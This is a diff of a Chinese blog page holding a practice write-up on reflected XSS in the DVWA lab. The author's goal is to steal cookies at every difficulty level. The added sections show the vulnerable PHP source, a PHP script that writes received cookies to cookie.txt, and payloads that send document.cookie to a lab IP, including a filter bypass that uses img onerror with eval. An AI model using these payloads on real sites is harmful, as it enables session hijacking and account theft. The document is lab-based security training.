@@ -27,11 +27,15 @@
 <meta property="og:site_name" content="学习记录">
 <meta property="og:description" content="从MRCTF的那道XSS之后感觉对XSS的实战太陌生了，回来靶场练基本功，先从dvwa开始吧。网上的答案什么的全是测一下能否弹窗然后就结束了，太简单了，这一次练习必须所有题目都可以偷到cookie！">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/1592114-20190411201659763-947904709.png">
+<meta property="og:image" content="http://example.com/images/1651119707909.png">
+<meta property="og:image" content="http://example.com/images/1651119884508.png">
 <meta property="article:published_time" content="2022-04-28T03:32:18.000Z">
-<meta property="article:modified_time" content="2022-04-28T04:16:31.664Z">
+<meta property="article:modified_time" content="2022-04-28T04:26:16.416Z">
 <meta property="article:author" content="MirRoR4s">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/1592114-20190411201659763-947904709.png">
 
 <link rel="canonical" href="http://example.com/2022/04/28/DVWA-XSS-Reflected/">
 
@@ -213,7 +217,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2022-04-28 11:32:18 / 修改时间：12:16:31" itemprop="dateCreated datePublished" datetime="2022-04-28T11:32:18+08:00">2022-04-28</time>
+              <time title="创建时间：2022-04-28 11:32:18 / 修改时间：12:26:16" itemprop="dateCreated datePublished" datetime="2022-04-28T11:32:18+08:00">2022-04-28</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -237,6 +241,32 @@
 
       
         <p>从MRCTF的那道XSS之后感觉对XSS的实战太陌生了，回来靶场练基本功，先从dvwa开始吧。网上的答案什么的全是测一下能否弹窗然后就结束了，太简单了，这一次练习必须所有题目都可以偷到cookie！<span id="more"></span></p>
+<h2 id="0x01-反射型"><a href="#0x01-反射型" class="headerlink" title="0x01 反射型"></a>0x01 反射型</h2><p> <img src="/../images/1592114-20190411201659763-947904709.png" alt="img"> </p>
+<p>1.low等级</p>
+<p>源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>没有任何过滤。直接偷cookie！ip地址是接收cookie的服务器地址，在上面写了一个php脚本接收cookie并保存起来。代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    @<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;joke&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filePath</span> = <span class="string">&quot;cookie.txt&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$handler</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filePath</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$handler</span>, <span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$handler</span>);   </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&#x27;http://192.168.168.128?joke=&#x27;</span>+<span class="built_in">encodeURIComponent</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>接收到的cookie：<img src="/../images/1651119707909.png" alt="1651119707909"></p>
+<p>2.medium等级</p>
+<p>源代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="variable constant_">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = <span class="title function_">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    echo <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>仅仅只是把”<script>"标签过滤了，这里选择用其他标签吧。</p>
+<p>payload：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;test&quot;</span>&gt;</span><br><span class="line">	<span class="keyword">var</span> a = <span class="string">&#x27;http://192.168.168.128?joke=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br><span class="line">	<span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">	img.<span class="property">src</span> = a;</span><br><span class="line"> &lt;/div&gt;</span><br><span class="line"> <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(test.innerText)</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>接收到的cookie：<img src="/../images/1651119884508.png" alt="1651119884508"></p>
+<p>3.high等级</p>
+<p>源代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="variable constant_">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = <span class="title function_">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    echo <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>对script标签的正则替换。跟medium一样等级的payload也能过，但是这里用别的标签展示一下🤭</p>
 
     </div>
 
@@ -320,6 +350,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="nav-number">1.</span> <span class="nav-text">0x01 反射型</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
